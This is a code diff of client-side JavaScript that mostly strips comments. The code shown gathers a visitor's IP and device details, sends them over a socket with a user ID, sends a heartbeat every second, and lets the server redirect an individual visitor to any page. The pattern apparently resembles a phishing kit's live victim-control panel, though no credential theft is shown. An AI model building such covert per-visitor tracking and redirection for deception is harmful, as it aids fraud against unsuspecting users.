@@ -132,21 +132,17 @@
                 // Example usage:
                 const deviceType = getDeviceType();
 
-                // alert(`OS: ${getOS()} - Browser: ${browserName} - Device: ${getDeviceName()}`)
-
                 ///////////////////////////////////////////////
                 //////// GETTING USER AGENT INFOS END /////////
                 ///////////////////////////////////////////////
 
                 function isGapLessThan3Seconds(otherDatetime) {
-                    // Create Date objects for the current datetime and the other datetime
+
                     const currentDatetime = new Date();
                     const otherDate = new Date(otherDatetime);
 
-                    // Calculate the difference in milliseconds
                     const differenceInMilliseconds = Math.abs(currentDatetime - otherDate);
 
-                    // Check if the difference is less than 3000 milliseconds (3 seconds)
                     return differenceInMilliseconds < 3000;
                 }
 
@@ -161,7 +157,7 @@
                 let popupWindow;
                 let date = new Date()
                 setTimeout(function() {
-                    // popupWindow = window.open("./popup.html", "PopupWindow", "width=800,height=600");
+
                     if (!id) {
                         data = {
                             ipAddress: ip,
@@ -183,12 +179,12 @@
                             popupOpen: false
                         }
                         socket.emit('formSubmit', data);
-                        // localStorage.setItem('id', data.userId)
                         id = data.userId
                         localStorage.setItem('userId', id)
                     } else {
                         sendUpdate(false)
                     }
+
                 }, 1000)
 
 
@@ -241,12 +237,6 @@
                     sendUpdate(false)
                 })
                 
-    
-                // socket.on('closePopup', (userId) => {
-                //     if (userId === id) {
-                //         window.close()
-                //     }
-                // })
 
                 
                 socket.on('mainRedirect', (userId, url) => {
@@ -292,37 +282,11 @@
                         window.location.href = page
                     }
                 })
-
-                // socket.on('checkResponse', (userId) => {
-                //     if (userId === id) {
-                //         socket.emit('userExist', userId)
-                //     }
-                // })
                 
                 setInterval(() => {
+                    localStorage.setItem('lastDate', new Date().toLocaleString())
                     socket.emit('userExist', id)
                 }, 1000);
-
-                // Attach a beforeunload event listener to detect page unload
-                // window.addEventListener('beforeunload', function (event) {
-                //     // if (!leavingPage) {
-                //         // This message will prompt the user with a confirmation dialog
-                //         // event.preventDefault(); // Modern browsers require this line to display the dialog
-                //         // event.returnValue = ''; // This line is required for older browsers
-
-                //         // Send a socket message when the user closes the page
-                //         // socket.emit('userClosedPage', id); // Adjust according to your socket setup
-                //         // }
-                //     });
-                    
-                setInterval(() => {
-                    localStorage.setItem('lastDate', new Date().toLocaleString())
-                }, 1000);
-
-                // Attach an unload event listener to detect page close or refresh
-                // window.addEventListener('unload', function () {
-                //     leavingPage = true;
-                // });
 
 
 
